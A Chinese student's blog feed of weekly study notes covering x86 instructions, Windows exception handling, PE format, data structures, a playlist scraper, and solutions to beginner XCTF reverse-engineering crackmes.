<li>IMUL<br>
用于有符号数的乘法<br>
一个操作数时类似于MUL。<br>
当有两个操作数时，两者相乘，结果放到第一个操作数中<br>
当有三个操作数时，如，“IMUL EBP,DWORD PTR [ESI+74], FF800002”,意思是EBP=[ESI+74]*FF800002</li>
<li>DIV(无符号)/IDIV(有符号)<br>
DIV只有一个操作数，结果存放到EDX:EAX中<br>
IDIV：<br>
一个操作数时，于DIV相似<br>
两个操作数时，第一个除以第二个，结果存放到第一个操作数中<br>
三个操作数时，第二哥除以第一个，结果存放到第一个操作数中<br>
（与IMUL类似）</li>
<li>XADD(交换并相加)<br>
XCHG和ADD的组合，先将两个操作数交换数值，然后值相加赋给第一个操作数</li>
<li>NEG<br>
取反</li>
</ol>
<h2 id="逻辑指令">逻辑指令</h2>
<p>两个操作数，将两个操作数按位运算，并将结果存入第一个操作数中</p>
<ol>
<li>AND<br>
两个二进制位都为1，结果为1，此外都为0</li>
<li>OR<br>
有一位为1，结果就为1</li>
<li>XOR<br>
不同取1，相同取0</li>
<li>NOT<br>
取反（1-0，0-1）</li>
</ol>
<h1>两个攻防世界上的新手re题</h1>
<p>其实没看出来哪跟re有关了</p>
<h2 id="第一个">第一个</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzYmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5076&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag就是解出的hash值，没啥难度。（就是为了凑行数）</p>
<h2 id="第二个">第二个</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzcmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5077&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<p>就用16进制编辑器打开然后搜索“flag”</p>
<h1>写了个爬自己网易云红心歌单的爬虫</h1>
<p><a href="https://brubbish.github.io/53778.html">一个爬取自己网易云歌单的爬虫</a></p>
<p>其实还没写完</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.11-2020.05.17</title>
    <url>/32652.html</url>
    <content><![CDATA[<h1>Windows下的异常处理</h1>
<p>操作系统处理程序错误或异常的一系列流程和技术的总称。主要有两种异常处理技术，SEH（结构化异常处理）和VEH（向量化异常处理）</p>
<h2 id="基本概念">基本概念</h2>
<p>中断是由外部硬件设备或异步事件产生的，异常是由内部事件产生的，可分为故障、陷阱、终止 3类。前两个是可恢复的，第三个是不可恢复的，系统必须重启</p>
<h3 id="异常列表">异常列表</h3>
<p><img src="https://s1.ax1x.com/2020/05/18/YfskvR.png" alt="YfskvR.png"><br>
由cpu引发的称为硬件异常，如访问一个无效的地址；由操作系统或程序引发的称为软件异常<br>
代码中可以用RaiseException()主动引发一个软件异常</p>
<span id="more"></span>  
<h3 id="异常处理的基本过程">异常处理的基本过程</h3>
<p>中断或异常发生时，cpu会通过中断描述符表（IDT）寻找处理函数。IDT是硬件和软件交接中断和异常的关口</p>
<h4 id="IDT">IDT</h4>
<p>IDT是一张位于物理内存中的线性表，共有256项，32位下每个项的长度是8字节，64位下每个项的长度是64字节。<br>
IDT的位置和长度是由cpu的IDTR寄存器描述的，IDTR共有84位，高32位为基址，低16位是表度长度。可以使用SIDT和LIDT指令读写该寄存器，LIDT只能在ring0下运行<br>
IDT的每一项都是一个门结构，包括：</p>
<ol>
<li>任务门描述符，用于cpu的任务切换</li>
<li>中断门，用于描述中断处理程序的入口</li>
<li>陷阱门，用于描述异常处理程序的入口</li>
</ol>
<p>用windbg的本地内核调试模式可以观察IDT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lkd&gt; !idt /a</span><br></pre></td></tr></table></figure>
<h4 id="异常处理的准备工作">异常处理的准备工作</h4>
<p><img src="https://s1.ax1x.com/2020/05/18/YfsVDx.png" alt="YfsVDx.png"><br>
当由异常或者中断发生时，cpu会根据中断类型号执行对应的中断处理程序。<br>
各个异常处理函数除了针对本异常的特定处理之外，通常会将异常信息进行封装。<br>
封装的内容中，一部分是异常记录，包含本次异常的信息，包括异常代码（异常产生的原因）、异常标志、异常发生的地址等；另一部分是陷阱帧，它精确的描述了发生异常时的线程状态，该结构与处理器有关，在不同平台上结构不同。<br>
封装后，异常处理函数会调用nt!KiDispatchException函数处理异常，</p>
<h4 id="内核态的异常处理过程">内核态的异常处理过程</h4>
<p>即当PreviousMode为KernelMode时。此时KiDispatchException会进行以下分发异常</p>
<ol>
<li>检测系统是否正在被内核调试器调试。如果内核调试器存在，系统就把异常处理的控制权转交给内核调试器。内核调试器取得控制权后会根据用户对异常处理的设置来确定是否要处理异常。如果处理了，那么异常的线程就会回到原来的位置继续执行；如果无法确定是否处理，就发生中断，由用户决定处理</li>
<li>如果不存在内核调试器，或者1中不处理该异常，系统将调用nt!RtlDispatchException,根据线程注册的结构化异常处理过程来处理</li>
<li>如果2时没有处理异常，系统会让内核调试器再次取得对异常的处理权</li>
<li>如果不存在内核调试器或3中调试器仍不处理，系统就认为不能继续运行了，会直接KeBugCheckEX,产生蓝屏错误<br>
在上述异常处理过程中，只有在某一步中异常没有处理才会进行下一个过程，只要异常被处理了，就会终止整个异常处理过程</li>
</ol>
<h4 id="用户态异常处理过程">用户态异常处理过程</h4>
<p>即当PreviousMode为UserMode时。此时KiDispatchException依然会检测内核调试器是否存在，如果存在就会优先把控制权交给内核调试器。多数情况下，内核调试器不处理用户态的异常，nt!KiDispatchException就会进行如下过程：</p>
<ol>
<li>如果发生异常的程序正在被调试，那么将异常信息发送给正在调试的用户态调试器；如果没有被调试就跳过这个步骤</li>
<li>如果没有被调试或调试器未处理异常，那么在栈上放置EXCEPTION_RECORD和CONTEXT两个结构，并将控制权返回用户态ntdll.dll中的KiUserExceptionDispatche函数，由它调用其它函数进行用户态的异常处理，这一部分涉及SEH和VEH两种处理机制。如果没有调试器能附加或调试器处理不了异常，系统就调用ExitProcess函数结束程序</li>
<li>如果2未能处理该异常，那么会再次回到nt!KiDispatchException,再次把异常信息发送给用户态的调试器，如果没有调试器则直接结束进程</li>
<li>如果3中调试器仍不处理，则nt!KiDispatchException再次把异常分发给进程的异常端口进行处理。该端口通常由子系统进程csrss.exe进行监听。子系统监听后会显示一个“应用程序错误”对话框。可以单击按钮，将其附加到调试器。如果没有调试器或者处理不了，则程序被终结</li>
<li>在终结程序之前，系统会再次调用发生异常的线程中的所有异常处理过程，这是线程异常处理过程中清理未释放资源的机会</li>
</ol>
<h1>C++</h1>
<p>按照http://c.biancheng.net/cplus/ 的顺序</p>
<h2 id="类和对象">类和对象</h2>
<p>在之前的周报中有记过<a href="https://brubbish.github.io/20849.html#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%88OOP%EF%BC%89%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%90%8D%E8%AF%8D">2020.03.30-2020.04.05</a>，现在忘了一些，再看一看，加深印象。<br>
 <br>
类可以看作 c 语言中结构体的升级版。<br>
类的成员不但可以是变量，还可以是函数,通过类定义出的变量叫做对象<br>
（也将类的成员变量称为属性，类的成员函数称为方法）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s的年龄是 %d，成绩是 %f\n&quot;</span>, name, age, score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> <span class="title">stu1</span>;</span></span><br><span class="line">stu1.name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">stu1.age = <span class="number">15</span>;</span><br><span class="line">stu1.score = <span class="number">92.5f</span>;</span><br><span class="line">stu1.<span class="built_in">say</span>();</span><br></pre></td></tr></table></figure>
<p>先用<strong>关键字</strong>class定义了一个<strong>类</strong>student，用这个类创建了一个<strong>对象</strong>stu1，后面这个过程叫做<strong>类的实例化</strong>，所以也称对象是类的一个<strong>实例</strong></p>
<p>在面向对象编程中，类由一组相关联的函数和变量组成，可以将一个或多个类放在一个源文件中，在使用时引入对应的类，调用需要的函数。</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.04-2020.05.10</title>
    <url>/12483.html</url>
    <content><![CDATA[<h1>攻防世界新手题</h1>
<h2 id="RE">RE</h2>
<h3 id="insanity">insanity</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzkmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5079&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<p>原来flag还能长&quot;9447{This_is_a_flag}&quot;这样…</p>
<span id="more"></span>
<h3 id="logmein">logmein</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzgmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5078&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400707 loc_400707:                             ; CODE XREF: main+177↓j</span><br><span class="line">.text:0000000000400707                 lea     rdi, [rbp+s]    ; s</span><br><span class="line">.text:000000000040070B                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:000000000040070F                 mov     [rbp+var_88], rax</span><br><span class="line">.text:0000000000400716                 call    _strlen</span><br><span class="line">.text:000000000040071B                 mov     rdi, [rbp+var_88]</span><br><span class="line">.text:0000000000400722                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400725                 jnb     loc_4007AC</span><br><span class="line">.text:000000000040072B                 lea     rdi, [rbp+var_20] ; s</span><br><span class="line">.text:000000000040072F                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400733                 mov     [rbp+var_90], rax</span><br><span class="line">.text:000000000040073A                 call    _strlen</span><br><span class="line">.text:000000000040073F                 mov     rdi, [rbp+var_90]</span><br><span class="line">.text:0000000000400746                 cmp     rdi, rax</span><br><span class="line">.text:0000000000400749                 jb      loc_400754</span><br><span class="line">.text:000000000040074F                 call    sub_4007C0</span><br><span class="line">.text:0000000000400754 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400754</span><br><span class="line">.text:0000000000400754 loc_400754:                             ; CODE XREF: main+119↑j</span><br><span class="line">.text:0000000000400754                 movsxd  rax, [rbp+var_54]</span><br><span class="line">.text:0000000000400758                 mov     cl, [rbp+rax+var_20]</span><br><span class="line">.text:000000000040075C                 mov     [rbp+var_55], cl</span><br><span class="line">.text:000000000040075F                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:0000000000400762                 cdq</span><br><span class="line">.text:0000000000400763                 idiv    [rbp+var_2C]</span><br><span class="line">.text:0000000000400766                 movsxd  rsi, edx</span><br><span class="line">.text:0000000000400769                 mov     cl, byte ptr [rbp+rsi+var_28]</span><br><span class="line">.text:000000000040076D                 mov     [rbp+var_56], cl</span><br><span class="line">.text:0000000000400770                 movsx   edx, [rbp+var_55]</span><br><span class="line">.text:0000000000400774                 movsx   edi, [rbp+var_56]</span><br><span class="line">.text:0000000000400778                 xor     edx, edi</span><br><span class="line">.text:000000000040077A                 mov     cl, dl</span><br><span class="line">.text:000000000040077C                 mov     [rbp+var_57], cl</span><br><span class="line">.text:000000000040077F                 movsxd  rsi, [rbp+var_54]</span><br><span class="line">.text:0000000000400783                 movsx   edx, [rbp+rsi+s]</span><br><span class="line">.text:0000000000400788                 movsx   edi, [rbp+var_57]</span><br><span class="line">.text:000000000040078C                 cmp     edx, edi</span><br><span class="line">.text:000000000040078E                 jz      loc_400799</span><br><span class="line">.text:0000000000400794                 call    sub_4007C0</span><br><span class="line">.text:0000000000400799 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400799</span><br><span class="line">.text:0000000000400799 loc_400799:                             ; CODE XREF: main+15E↑j</span><br><span class="line">.text:0000000000400799                 jmp     $+5</span><br><span class="line">.text:000000000040079E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040079E</span><br><span class="line">.text:000000000040079E loc_40079E:                             ; CODE XREF: main:loc_400799↑j</span><br><span class="line">.text:000000000040079E                 mov     eax, [rbp+var_54]</span><br><span class="line">.text:00000000004007A1                 add     eax, 1</span><br><span class="line">.text:00000000004007A4                 mov     [rbp+var_54], eax</span><br><span class="line">.text:00000000004007A7                 jmp     loc_400707</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps:<br>
CQD:<br>
把edx的所有位设成eax最高位的值</p>
</blockquote>
<p>在最后的“jmp     loc_400707”实现循环<br>
跳转到sub_4007C0后，就显示输入的密码错误</p>
<p>由于不会分析了 就 看了伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.\n&quot;</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;To continue, you must enter the correct password.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your guess: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%32s&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    sub_4007C0(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">  &#125;</span><br><span class="line">  sub_4007F0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中v7可以转换为16进制再转换成字符串，所以v7在运算时变为&quot;haramb&quot;<br>
得到flag的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> k1[]=<span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> k2[]=<span class="string">&quot;harambe&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">7</span>;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(k1);i++)&#123;</span><br><span class="line">		s[i]=(<span class="keyword">char</span>)(*(k2+i%a)^k1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="彦林学长给的一题">彦林学长给的一题</h3>
<p>题在这边：<span class="exturl" data-url="aHR0cHM6Ly96aGFuZ3NpLmxhbnpvdXMuY29tL2ljZnp4N2M=">easyYM<i class="fa fa-external-link-alt"></i></span><br>
看了他的wp<br>
嗯…感觉自己知道 有flag的那块地方没有被调用，但一方面是不知道是哪些函数跟flag有关（通过查看字符串）(后来用ida打开发现，放在main函数里，刚开始就跳过了） ，另外就是没有想到od设置某处为新eip的功能</p>
<h1>装Pwntools</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure>
<h1>数据结构</h1>
<h2 id="多重链表">多重链表</h2>
<ul>
<li>广义表<br>
广义表中的元素可以是一个单元素，也可以是另一个表。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Glist</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> tag;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    Element Type Data;  <span class="comment">//用这个标志控制结点为单元素或者广义表</span></span><br><span class="line">    Glist anlist;</span><br><span class="line">  &#125;</span><br><span class="line">  Glist Next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>广义表即为一个多重链表<br>
多重链表中结点的指针域有多个（如anlist和Next）,包含两个指针域的链表不一定是多重链表(如双向链表)</p>
<h2 id="堆栈">堆栈</h2>
<p>数据对象集：有穷线性表<br>
操作集：堆栈的长度、堆栈元素</p>
<ol>
<li>生成长度为MaxSize的空堆栈</li>
<li>判断堆栈是否满了</li>
<li>将一个元素压入堆栈</li>
<li>判断堆栈是否为空</li>
<li>删除并返回栈顶元素<br>
栈的顺序存储结构由一个<strong>一位数组</strong>和一个<strong>记录栈顶位置</strong>的变量top组成</li>
</ol>
<h3 id="顺序存储">顺序存储</h3>
<h4 id="入栈">入栈</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top==MaxSize<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;堆栈满&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  s-&gt;data[s-&gt;top]=item;</span><br><span class="line">  (s-&gt;top)++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="出栈">出栈</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(s-&gt;top=<span class="number">-1</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;堆栈空&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  data=s-&gt;data[(s-&gt;top)--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="链式存储">链式存储</h3>
<p>用一个单链表，称作链栈<br>
top在链表的头结点，头结点里不存放其他元素</p>
<h4 id="入栈-2">入栈</h4>
<p><img src="https://s1.ax1x.com/2020/05/08/Ynrdv6.png" alt="Ynrdv6.png"></p>
<h4 id="出栈-2">出栈</h4>
<p>记得free()<br>
<img src="https://s1.ax1x.com/2020/05/08/Ynr0KK.png" alt="Ynr0KK.png"></p>
<h2 id="队列">队列</h2>
<p>只能在一端插入（入队），在另一端删除（出队）<br>
先进先出</p>
<h3 id="顺序存储-2">顺序存储</h3>
<p>一个一维数组+一个记录头元素的变量front+一个记录尾元素的变量rear<br>
front指向第一个元素的前一个位置</p>
<ul>
<li>循环队列<br>
当front和rear相等时为空（或相等）（解决方案：加入一个额外标记；使用n-1个空间）</li>
</ul>
<p><img src="https://s1.ax1x.com/2020/05/08/YnrBDO.png" alt="YnrBDO.png"></p>
<h3 id="链式存储-2">链式存储</h3>
<p>存在单链表中，front和rear指针分别指向头和尾</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>数据结构</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>一个爬取自己网易云歌单的爬虫</title>
    <url>/53778.html</url>
    <content><![CDATA[<p>现在只弄了红心歌单<br>
可以得出每个歌手的出现次数（不包括多人唱一首的情况）<br>
还没有排序<br>
也不能输出到文件<br>
参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z1MjU0OTgzMzAzL2FydGljbGUvZGV0YWlscy83OTQzNDg4Mg==">https://blog.csdn.net/fu254983303/article/details/79434882<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;</span><br><span class="line">r=requests.get(<span class="string">&#x27;https://music.163.com/playlist?id=xxxxxxxxx&#x27;</span>,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">html=r.text</span><br><span class="line">reg_list = <span class="string">&#x27;&lt;ul class=&quot;f-hide&quot;&gt;&lt;li&gt;(.*?)&lt;/ul&gt;&#x27;</span></span><br><span class="line">reg_list = re.<span class="built_in">compile</span>(reg_list, re.S)</span><br><span class="line">content = re.findall(reg_list, html)</span><br><span class="line">reg = <span class="string">&#x27;&lt;a href=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&lt;/li&gt;&#x27;</span>  </span><br><span class="line">reg = re.<span class="built_in">compile</span>(reg, re.S)</span><br><span class="line">song_list = re.findall(reg, content[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">singer=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    singer.append([<span class="number">0</span>]*<span class="number">2</span>)</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> song_list:</span><br><span class="line">    url=<span class="string">&quot;https://music.163.com&quot;</span>+song_list[i][<span class="number">0</span>]</span><br><span class="line">    r=requests.get(url,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">    htm=r.text</span><br><span class="line">    reg_list2=<span class="string">&#x27;&lt;p class=&quot;des s-fc4&quot;&gt;歌手：&lt;span title=&quot;(.*?)&quot;&gt;&#x27;</span></span><br><span class="line">    reg_list2=re.<span class="built_in">compile</span>(reg_list2,re.S)</span><br><span class="line">    s=re.findall(reg_list2,htm)</span><br><span class="line"></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j&lt;k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j==k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">            singer[k][<span class="number">0</span>]=s</span><br><span class="line">            singer[k][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(singer)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.25-2020.05.24</title>
    <url>/33336.html</url>
    <content><![CDATA[<h1>PE文件格式</h1>
<p>可执行文件的格式是操作系统本身执行机制的反映。<br>
PE（Portable Executable File Format 可移植的执行体)<br>
头文件winnt.h中的image format给出了pe文件的内容，可以找到所有pe文件的数据结构定义、枚举类型、常量定义等<br>
exe和dll文件使用完全相同的pe格式，唯一的区别就是用一个字段标识出这个文件是exe还是dll<br>
64位Windows只是对pe格式进行了一些简单的修饰，新的格式为pe32+，没有新的结构加入，只是把32位字段扩展成64位<br>
<img src="https://s1.ax1x.com/2020/05/25/tCceGn.png" alt="tCceGn.png"></p>
<span id="more"></span>
<h2 id="PE的基本概念">PE的基本概念</h2>
<p>pe文件的内容分为不同区块，区块中包含代码或数据，各个区块按页边界对齐。区块大小没有限制，是一个连续的结构。每个块在内存中都有自己的属性如是否包含代码、是否可读写等<br>
pe文件不是作为单一内存映射文件被载入内存。pe装载器遍历pe文件并决定文件的哪部分被映射。磁盘文件一旦被载入内存，磁盘上的数据结构布局和内存中的数据结构布局就是一致的，但数据之间的的相对位置可能会改变</p>
<h3 id="基地址">基地址</h3>
<p>PE文件通过加载器载入内存后，内存中的版本称为模块。映射文件的起始地址（基地址）称为模块句柄，可以通过模块句柄访问内存中的其他数据结构。<br>
<img src="https://s1.ax1x.com/2020/05/25/tCcm2q.png" alt="tCcm2q.png"><br>
内存中的模块代表进程将这个可执行文件所需要的代码、数据、输入表、输出表及其他有用的数据结构所使用的内存都放在一个连续的内存块中。PE文件的剩余部分可以被读入，但可能无法被映射。例如在将调试信息放到文件尾部时，PE的一个字段会告诉系统不能映射的数据将被放置在文件的尾部。在32位Windows种可以直接调用GetModuleHandle取得指向dll的指针，通过该指针访问DLL Mdodle。<br>
基地址的值是由pe文件本身设定的</p>
<h2 id="虚拟地址（Virtual-Address）">虚拟地址（Virtual Address）</h2>
<h3 id="相对虚拟地址（RVA）">相对虚拟地址（RVA）</h3>
